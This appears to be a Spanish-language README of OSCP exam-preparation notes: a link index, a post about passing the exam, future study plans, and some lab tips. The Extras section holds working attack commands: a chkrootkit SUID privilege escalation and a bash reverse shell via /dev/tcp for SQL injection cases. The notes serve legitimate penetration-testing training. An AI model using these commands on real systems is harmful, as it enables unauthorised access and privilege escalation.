# OSCP preparation

## List
- [**Windows Active Directory**](./winad.md)
- [**Shell Management**](./shellMGT.md)
- [**General enumeration**](./enum.md)
- [**Engagement Structure**](https://academy.hackthebox.com/module/39/section/384)
- [**File transfers**](./fileTransfer.md)
- [**Metasploit tricks**](./msf.md)
- [**Pivoting**](./pivoting.md)
- [**Cross-Site Scripting**](./xss.md)
- [**SQL Injection**](./sqli.md)
- [**Local File Inclusion & Path Traversal**](./LFI.md)
- [**Arbitrary File Upload**](./arbitraryFileUpload.md)
- [**Command Injection**](./commandInjection.md)
- [**Other web attacks**](./otherWebAttacks.md)
- [**Privilege Escalation**](./privEsc.md)
- [**Windows Privilege Escalation**](./winPrivEsc.md)
- [**Reporting**](./reporting.md)
- [**Documents, Office, LibreOffice, macros attacks**](./office.md)
- [**Cookie Extraction**](./cookieExtraction.md)
- [**Buffer Overflow**](./bufferOverflow.md)
- [**SMTP/POP/IMAP Mail Server Pentesting**](./smtp.md)
- [**Library-MS WebDav Attack**](./webdav-phishing.md)


## Aprobé el examen
Bueno mis queridos lectores de mi humilde blog, les quería comentar que este Domingo 13 de Julio del 2025 me llegó el mail de Offensive Security que me decía que había aprobado el examen de OSCP.
Mi recorrido por este examen fue bastante arduo y largo pues hice una sobrepreparación porque leí demasiada gente llorando y copeando en [/r/OSCP](https://www.reddit.com/r/oscp/) que me dió un poco de miedo reprobarlo y tener que pagar el recuperatorio que cuesta como 150 dolares.
Lo que hice para prepararme fue:
- Rendir [PNPT](https://certified.tcm-sec.com/76169ba5-9caf-44c0-96b4-6f76b342f0c4#acc.mv0WE3Kr)
- Rendir [CPTS](https://www.credly.com/badges/2a9e3b5b-f684-45d9-ab2d-a74e7cf9714e/public_url)
- Hacer tres prolabs en Hack the Box:
    1. Dante
    2. Zephyr
    3. Rasta
- Hacerme toda la [famosa lista de TJ Null](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview) todas las maquinas de Hack The Box y de Proving Grounds practice.
Cabe aclarar que tengo 3 años de experiencia en la industria y que también estoy siguiendo un grado en ciencias de la computación que es durisimo, así que no es que me preparé de la nada, ya tenía una base sólida de conocimientos.
Pero si consideramos desde que empecé a estudiar para PNPT hasta que rendí el examen fueron aproximadamente 6 meses.
Cualquier duda que tengan al respecto no tengo ningún problema en responderla por discord, reddit o el mail que está en mi [página web](https://grunt.ar/) :)

----

## ¿Y ahora que?

Ahora probablemente siga estudiando topicos que me interesan que no son tanto de "pentesting" como tal.
- MalDev => Tengo un proyecto de armar un C2 funcional con Telegram y con agentes en RUST, algo así como Pysilon pero con RUST y Telegram en vez de Python y Discord.
    - También seguro me apoye en algunos modulos de Hack The Box Academy del "CAPE" que están buenos para aprender evasión entre otros topicos.
- ExploitDev => Con mis conocimientos actuales de arquitectura (ANSI C, NASM x86_64, RISC-V, ABI Linux) me siento capaz de poder aprender a hacer buen reversing y aprender explotación a bajo nivel. Voy a estar estudiando en [pwn.college](https://pwn.college/) y con el curso de [ret2systems](https://wargames.ret2.systems/course).
    - La verdad que me gustaría ir directo por el OSED pero es muy caro :/
- BSCP => Burp Suite Certified Practitioner. O sea, aprender hacking web más avanzado, actualmente poseo la eWPTv2 y trabajé mucho sobre aplicaciones web y mobile dentro de mi labor como AppSec, pero aún así creo que puedo abordar más estudiando en los labs de port swigger que tienen muy buena pinta.


## Extras

### Maquina centOS una privesc rara
- https://seclists.org/fulldisclosure/2019/Apr/24


### En una maquina que pwnee que tenía la vuln shellshock, fue clave la enumeración para poder explotar la misma
```
❯ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400 -x cgi,php,sh --add-slash
```

#### el -x sh me dió la enumeración correcta

Sí encuentro el puerto 53 es conveniente seguir la siguiente guía de enumeración
https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns

### Vulnerabilidad en chkrootkit versión 0.49. Para evitar usar metasploit, sirve chequear:
[https://www.exploit-db.com/exploits/33899](https://www.exploit-db.com/exploits/33899)

```
cat /etc/cron.daily

/usr/bin/chkrootkit
ls -la /usr/bin/chkrootkit     // Do we have SUID?
chkrootkit -V
echo "#!/bin/bash" > /tmp/update
echo "chmod +s /bin/bash" >> /tmp/update
Wait a While ...
/bin/bash -p
whoami
```

### Problemas para reverse shell dentro de sqli

Hay veces que cuando puedo obtener RCE mediante una sqli porque tengo acceso de escritura con el user de la db que maneja la aplicación web no siempre me quiere ejecutar bien una revshell, pero con esto sí:

```
bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
```

es el único que me vino funcionando en 2 maquinas de SQLI